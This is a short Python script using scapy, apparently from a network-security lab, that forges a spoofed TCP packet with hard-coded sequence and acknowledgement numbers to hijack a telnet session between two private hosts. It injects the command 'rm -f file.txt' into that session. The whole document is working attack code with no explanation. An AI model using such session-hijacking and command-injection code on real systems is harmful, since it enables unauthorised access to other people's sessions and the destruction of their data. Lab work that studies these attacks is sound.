#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6",dst="10.9.0.5")
tcp = TCP(sport=55564, dport=23,flags="A",seq=2301300949,ack=977418406)
data = "\r rm -f file.txt \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
